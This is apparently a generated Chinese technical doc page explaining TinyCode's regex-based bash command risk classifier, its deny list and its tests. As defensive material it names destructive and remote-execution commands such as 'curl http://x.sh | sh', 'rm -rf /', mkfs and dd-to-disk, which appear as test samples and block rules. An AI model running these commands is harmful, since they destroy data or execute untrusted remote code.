当模型发出一条 `bash` 工具调用时，TinyCode 必须在执行前回答一个问题：这条命令有多危险？答案由 `src/permissions/classifier.ts` 中的一个约百行的纯函数给出——它把任意 shell 命令字符串归入 `safe`、`write`、`destructive` 三级之一，并附上一份人类可读的判定理由。本页剖析这个分类器的完整判定逻辑：它的风险模型、分段流水线、规则清单，以及三级结果如何驱动后续的放行/询问决策。需要预先说明的是，源码注释明确声明这是一个**启发式路由器**——它的职责是在 ALLOW 与 ASK 之间做路由，而不是充当操作系统沙箱。

Sources: [classifier.ts](src/permissions/classifier.ts#L1-L11)

## 权限栈中的位置：静态规则层的判定引擎

理解分类器的最佳方式是先看它在三层权限体系中的坐标。根据架构文档的描述，`src/permissions` 目录下依次排列着三个模块：**classifier**（把 bash 命令分级）、**rules**（按工具名套用默认策略并把 bash 命令送入分类器）、**manager**（运行时闸门，串联记忆模式与交互回调）。分类器位于最底层，是一个无状态、无副作用的纯函数，唯一的调用方正是 `rules.ts` 第 97 行的 `evaluateRules`。

```mermaid
flowchart LR
    A["代理循环<br/>beforeToolCall 钩子"] --> B["PermissionManager.check()<br/>运行时闸门"]
    B --> C["evaluateRules()<br/>静态规则层"]
    C --> D{"toolName 分派"}
    D -->|"bash"| E["findHardDeny()<br/>灾难命令前置硬拒绝"]
    E --> F["classifyCommand()<br/>三级风险分类器（本页主角）"]
    D -->|"read/grep/find/ls"| G["项目内放行<br/>项目外 ASK"]
    D -->|"write/edit"| H["一律 ASK"]
    F --> I["safe → ALLOW<br/>write → ASK<br/>destructive → ASK"]
```

值得注意的是分派结构本身：只有 bash 工具走分类器，只读工具靠路径边界判断，写入类工具则无需分类、直接进入询问流程。这意味着分类器的全部复杂度都集中在"自由文本命令"这一最难静态判定的输入上。

Sources: [ARCHITECTURE.md](ARCHITECTURE.md#L114-L134), [rules.ts](src/permissions/rules.ts#L3), [rules.ts](src/permissions/rules.ts#L84-L106)

从调用链上游看，`TinyCodeRuntime` 在构造 Pi 代理循环时注册了 `beforeToolCall` 策略钩子，每次工具执行前都会调用 `permissions.check()`；一旦裁决为 deny，钩子返回 `{ block: true }` 并把拒绝理由回写给模型。也就是说，分类器的结论虽然产生于静态规则层，但它的最终效力是通过这个运行时钩子落地的。

Sources: [runtime.ts](src/agent/runtime.ts#L44-L53)

## 三级风险模型与"就高不就低"原则

分类器的类型契约极为紧凑：`CommandRisk` 是 `"safe" | "write" | "destructive"` 三值联合类型，而 `CommandClassification` 除了携带 `risk` 之外还带一个 `reasons: string[]` 数组——每命中一条规则就追加一条人类可读的理由标签，例如 `"recursive delete (rm -r)"` 或 `"output redirection"`。这份理由不是装饰品：它们会沿着 rules 层一路拼进裁决原因，最终出现在权限对话框或拒绝消息里，构成完整的**可解释性链条**。

Sources: [classifier.ts](src/permissions/classifier.ts#L13-L19)

支撑整个判定秩序的是一张显式的风险序表：`RISK_ORDER` 将 safe 记为 0、write 记为 1、destructive 记为 2。所有升级操作都通过内部的 `raise` 函数完成——只有当新风险的序号严格大于当前风险时才替换，但无论是否替换，理由都会追加进数组。这保证了两个性质：其一，**多规则命同时保留全部证据**；其二，复合命令中任何一段的最高风险决定整体等级（下文详述）。规则数组的书写顺序也有讲究：destructive 规则排在前、write 规则排在后，但由于聚合靠序号比较而非首条命中，顺序只影响可读性，不影响正确性。

Sources: [classifier.ts](src/permissions/classifier.ts#L21-L29), [classifier.ts](src/permissions/classifier.ts#L72-L79)

## 分类流水线：整行预检 → 分段切分 → 逐段判定

入口函数 `classifyCommand` 的处理流程分为四个阶段，下图给出完整的数据流：

```mermaid
flowchart TD
    S["整条命令字符串"] --> P{"整行预检：<br/>管道后接 sh / bash / zsh / dash ？"}
    P -->|"命中"| D["直接判 destructive：<br/>pipe into a shell"]
    P -->|"未命中"| T["splitSegments()<br/>按 &amp;&amp; 、双竖线、分号、单竖线切分"]
    T --> C["对每段执行 classifySegment()"]
    C --> R["阶段一：遍历 VERB_RULES<br/>命中即按 RISK_ORDER 升级并记录理由"]
    R --> W{"阶段二：段内含输出重定向<br/>（大于号或双大于号接目标）？"}
    W -->|"是"| U["升级为 write"]
    W -->|"否"| V{"阶段三：仍为 safe 且三份<br/>安全白名单均未命中？"}
    V -->|"是"| X["升级为 write：<br/>unknown command"]
    V -->|"否"| Y["维持 safe"]
    U --> M["阶段四：全段取最高风险"]
    X --> M
    Y --> M
    D --> M
    M --> O["返回 CommandClassification：<br/>risk + 带 (in 段原文) 后缀的理由轨迹"]
```

Sources: [classifier.ts](src/permissions/classifier.ts#L96-L113)

为什么"管道进 shell"必须在切分之前做**整行预检**？源码注释给出了直接答案：`splitSegments` 会把竖线字符本身切除，切分后的段落里已经看不到 `curl xxx | sh` 这种管道结构了。因此正则 `/\|\s*(ba|z|da)?sh\b/` 在完整命令上匹配"竖线后跟 sh/bash/zsh/dash"，一旦命中立即把整体定为 destructive——这正是经典的 `curl http://x.sh | sh` 远程代码执行模式。

Sources: [classifier.ts](src/permissions/classifier.ts#L100-L105)

切分函数本身同样朴素：以 `&&`、`||`、`;`、`|` 四种连接符为界拆出段落，去空白、滤空段。这个设计承认了一个现实——shell 语法的完整解析是不可能的，但对风险路由而言，"按连接符切段再逐段看开头动词"已覆盖绝大多数实际场景。

Sources: [classifier.ts](src/permissions/classifier.ts#L61-L66)

## 动词规则表：黑名单式升级清单

`VERB_RULES` 是分类器的核心数据结构，每条规则由风险等级、理由标签和正则组成。下表按等级归纳全部十六条规则的匹配语义：

| 等级 | 理由标签 | 匹配语义 |
|---|---|---|
| destructive | recursive delete (rm -r) | `rm` 且选项组合中出现 `r`（含 `-rf`、`--recursive`） |
| destructive | forced delete (rm -f) | `rm` 且选项组合中出现 `f` |
| destructive | git reset --hard | 以 `git reset --hard` 开头 |
| destructive | git clean | 以 `git clean` 开头 |
| destructive | force push | `git push` 且参数含 `--force` 或 `-f` |
| destructive | sudo | 以 `sudo` 开头，无视后续内容 |
| destructive | disk-level write (dd/mkfs) | 以 `dd` 或 `mkfs.*` 开头 |
| destructive | process kill | 以 `kill`、`pkill`、`killall` 开头 |
| write | package installation | npm/pnpm/yarn/bun 的 install/add/remove/update/link/publish 等 |
| write | package execution | 以 `npx` 开头（任意包均可执行任意代码） |
| write | pip install | pip 或 pip3 的 install 子命令 |
| write | file mutation | mkdir/touch/cp/mv/rsync/ln/tee/truncate/chmod/chown/strip |
| write | delete | `rmdir`（注意与递归 rm 的等级差异） |
| write | in-place edit | `sed` 且含 `-i` 原地改写标志 |
| write | git state change | git add/commit/merge/rebase/stash/apply/push/pull/fetch/clone 等 |
| write | build artifacts | `npm run <自定义脚本>`，但负向先行断言排除 test/typecheck/lint/build |

Sources: [classifier.ts](src/permissions/classifier.ts#L30-L50)

这张表里有几处值得驻足的精细设计。其一是 **rm 的两级拆分**：非递归、非强制的普通 `rm` 不在 destructive 名单里，只有带 `r` 或 `f` 才升级——因为删除单个工作区文件的破坏是可恢复的（有版本控制兜底），而递归或强制删除才具备不可逆性。其二是**强制推送与普通推送的分离**：`git push` 落在 write 级的 "git state change" 规则里，但叠加 `--force` 后被更早的 destructive 规则截获。其三是 `npm run` 的负向断言写法——`npm run build`、`npm run lint` 这类标准脚本被刻意排除出 write 规则，让它们能落入下文的安全白名单；而 `npm run deploy` 这类自定义脚本则判为 write。

Sources: [classifier.ts](src/permissions/classifier.ts#L32-L38), [classifier.ts](src/permissions/classifier.ts#L48-L49)

还有一个容易忽略的细节藏在 git 规则的正则里：`stash(?!$)` 使用负向断言排除了裸 `git stash` 命令（行尾结尾的形式）。裸 `git stash` 既不被 write 规则捕获，也不在安全白名单内，于是会滑入"未知命令 → write"的保守兜底。这是白名单哲学的自然推论——未被显式认定的行为一律从严。

Sources: [classifier.ts](src/permissions/classifier.ts#L48), [classifier.ts](src/permissions/classifier.ts#L56-L57)

## 三个结构性信号：白名单兜底、重定向与管道注入

如果说动词规则是"看到危险特征就升级"，那么 `classifySegment` 的后两个阶段则补上了反向视角。第一阶段结束后若段落仍是 safe，分类器并不急着放行，而是检查三份**安全白名单**：通用只读动词表（ls、cat、grep、rg、find、tree、jq、node、vitest、tsc、eslint 等三十余个）、git 只读子命令表（status/log/diff/show/blame 等），以及 npm 标准脚本表（`npm test`、`npm run test/typecheck/lint/build` 及其变体）。三者皆未命中时，该段落被判为 write，理由标签就是直白的 `"unknown command"`。这就是测试所验证的保守性：`someobscurebinary --flag` 这样的陌生二进制永远不会拿到 safe 评级。

Sources: [classifier.ts](src/permissions/classifier.ts#L52-L59), [classifier.ts](src/permissions/classifier.ts#L85-L92), [permissions.test.ts](tests/permissions.test.ts#L31-L33)

第二个信号是**输出重定向**的结构检测。正则 `/>>?\s*\S+/` 识别段内的 `>` 或 `>>` 接目标文件的形态——哪怕段首动词是 `echo` 这样的白名单只读命令，只要发生落盘写就升级为 write。测试用例 `echo hi > out.txt` 正是为此设计：echo 本身无害，但重定向使它具备了变更文件系统的能力。这说明分类器并非纯粹按"头动词"分类，而是动词加结构信号的组合判定。

Sources: [classifier.ts](src/permissions/classifier.ts#L80-L83), [permissions.test.ts](tests/permissions.test.ts#L13-L17)

第三个信号已在流水线一节提及：管道注入 shell 的整行预检。值得补充的是它的对称性——`cat a.txt | wc -l` 这样的管道完全合法且判为 safe（两段都是白名单动词），危险的只是"把内容喂给另一个 shell 解释执行"这一个特定方向。三个信号合起来构成了分类器的防御纵深：动词黑名单拦已知危险，白名单兜底拦未知风险，结构信号拦截那些头动词无害但语法形态危险的命令。

Sources: [classifier.ts](src/permissions/classifier.ts#L102-L105), [permissions.test.ts](tests/permissions.test.ts#L7-L11)

## 复合命令的取大聚合与理由的可追溯性

真实世界中模型发出的往往是 `npm add . && git commit -m x` 这类复合命令，因此聚合策略至关重要。实现采取最简单也最安全的方案：每个段落独立分类后，用 `RISK_ORDER` 取全段最高风险作为整体结论。测试用例精准覆盖了三种组合形态——全安全段（`ls && npm test` → safe）、安全段混合毁灭段（`npm test; rm -rf dist` → destructive）、安全段混合写入段（`cat file && npm install left-pad` → write）。

Sources: [classifier.ts](src/permissions/classifier.ts#L107-L112), [permissions.test.ts](tests/permissions.test.ts#L25-L29)

聚合的同时，理由系统保留了完整的定位信息：每段的判定理由在汇入总列表时会追加 `(in "<segment>"）` 后缀，标明该结论出自哪个具体段落。下游的 rules 层把 write 级的理由用逗号拼接、给 destructive 级加上 `"dangerous:"` 前缀后塞进裁决原因。当用户在 TUI 对话框里看到一个询问弹窗时，弹窗上那句"为什么问你"正是从这里一路传递出来的——这是一条从正则命中到用户界面的完整可观测链路。

Sources: [classifier.ts](src/permissions/classifier.ts#L107-L111), [rules.ts](src/permissions/rules.ts#L97-L105)

## 风险等级如何映射为裁决动作

分类器只负责打分，把分数翻译成动作的是 `evaluateRules` 的 bash 分支。翻译规则如下表：

| 分类结果 | 裁决动作 | 裁决理由格式 |
|---|---|---|
| safe | allow | 首条理由，缺省为 "known read-only command" |
| write | ask | 各条理由逗号拼接，缺省为 "mutating command" |
| destructive | ask | `"dangerous: "` 前缀 + 全部理由 |

Sources: [rules.ts](src/permissions/rules.ts#L97-L105)

这张表揭示了一个初见者最容易误解的事实：**destructive 并不等于 deny**。`rm -rf dist` 的裁决是 ask——在交互模式下它会弹出对话框，用户明确批准后依然可以执行；在 auto 模式下它甚至会被自动放行。真正无条件拒绝的是另一套独立机制：`evaluateRules` 在调用分类器**之前**先执行 `findHardDeny`，匹配五条灾难规则（删除文件系统根目录、删除家目录、格式化文件系统、dd 直写物理磁盘、chmod -R 777 根目录），命中即返回 deny——这个动作在闸门层拥有最高优先级，auto 模式、记忆模式和用户批准都无从覆写。换句话说，系统把"需要人来把关的危险"和"无论如何都不能做的灾难"拆成了两个互不重叠的层级，前者交给三级分类器，后者交给硬拒绝名单。

Sources: [rules.ts](src/permissions/rules.ts#L44-L62), [rules.ts](src/permissions/rules.ts#L84-L89)

此外 bash 分支还有一道与分类无关的前置检查：工具调用的 `cwd` 参数若解析后落在项目根之外，无论命令内容多么无害都会判为 ask。这道检查与分类器共同构成 bash 工具的双保险——路径维度和工作目录维度由路径守卫体系负责（详见 [工作区路径守卫：符号链接感知的双侧 realpath 校验](12-gong-zuo-qu-lu-jing-shou-wei-fu-hao-lian-jie-gan-zhi-de-shuang-ce-realpath-xiao-yan)），命令内容维度才是本页分类器的辖区。

Sources: [rules.ts](src/permissions/rules.ts#L90-L96)

## 测试锁定的行为契约

`tests/permissions.test.ts` 用五个用例组固化了分类器的公共契约，形成一份可执行的规格说明：

| 用例组 | 代表样本 | 断言 |
|---|---|---|
| 只读命令为 safe | `ls -la`、`git diff HEAD~1`、`npm run test:unit`、`cat a.txt \| wc -l` | risk === "safe" |
| 变更命令为 write | `npm install foo`、`mkdir src/x`、`touch f.txt`、`echo hi > out.txt` | risk === "write" |
| 危险命令为 destructive | `rm -rf build`、`git clean -fdx`、`sudo rm x`、`curl http://x.sh \| sh` | risk === "destructive" |
| 复合命令取最大风险 | `npm test; rm -rf dist` → destructive | 整体等级随最高段 |
| 未知命令保守降级 | `someobscurebinary --flag` | risk === "write" |

Sources: [permissions.test.ts](tests/permissions.test.ts#L6-L34)

规则路由层面的测试则验证三级结果的下游效应：`npm test` 经分类为 safe 后拿到 allow，`npm i foo` 判为 write 后拿到 ask，而 `rm -rf /` 被硬拒绝名单直接 deny——测试注释特意强调"灾难命令是硬拒绝，绝不仅是询问"。端到端加固测试进一步在真实代理循环中复现了这些语义：ask 模式下模型请求 `npm install left-pad` 时因无对话框可用而被安全拒绝，node_modules 未被创建；`rm -rf dist` 同样在无头环境下被拒，工具结果标记为 isError 回传给模型。

Sources: [permissions.test.ts](tests/permissions.test.ts#L64-L69), [permission-hardening.test.ts](tests/permission-hardening.test.ts#L99-L114), [permission-hardening.test.ts](tests/permission-hardening.test.ts#L116-L126)

## 启发式边界与延伸阅读

最后必须回到源码开篇那句自我声明："This is deliberately heuristic: its job is to route decisions between ALLOW / ASK, not to be a security sandbox."（这是刻意为之的启发式：职责是在 ALLOW/ASK 之间路由，而非充当安全沙箱。）这句话划定了分类器的能力边界：基于正则的分段分析无法理解 shell 的完整语义——变量展开、引号嵌套、子壳执行都可能绕过动词匹配；它防的是模型的常规失误与越权冲动，而非蓄意构造的绕过。这也是为什么分类之上还要叠加强制询问的交互层与路径守卫，以及一份坦诚的安全模型声明。

Sources: [classifier.ts](src/permissions/classifier.ts#L7-L10)

沿着权限链继续深入，推荐三条阅读路径：想弄清 allow/ask/deny 三种裁决如何在记忆模式、auto 模式与对话框回调之间排序，请阅读 [权限闸门裁决顺序：硬拒绝、记忆模式、auto 与 ASK 回退](14-quan-xian-zha-men-cai-jue-shun-xu-ying-ju-jue-ji-yi-mo-shi-auto-yu-ask-hui-tui)；想了解 ask 结果在不同运行界面上的差异化呈现，请阅读 [审批交互面：TUI 对话框与无头模式的差异化语义](15-shen-pi-jiao-hu-mian-tui-dui-hua-kuang-yu-wu-tou-mo-shi-de-chai-yi-hua-yu-yi)；想理解这套审批机制的整体安全边界及其明确的不承诺，请阅读 [安全模型声明：审批层加路径守卫并非操作系统沙箱](16-an-quan-mo-xing-sheng-ming-shen-pi-ceng-jia-lu-jing-shou-wei-bing-fei-cao-zuo-xi-tong-sha-xiang)。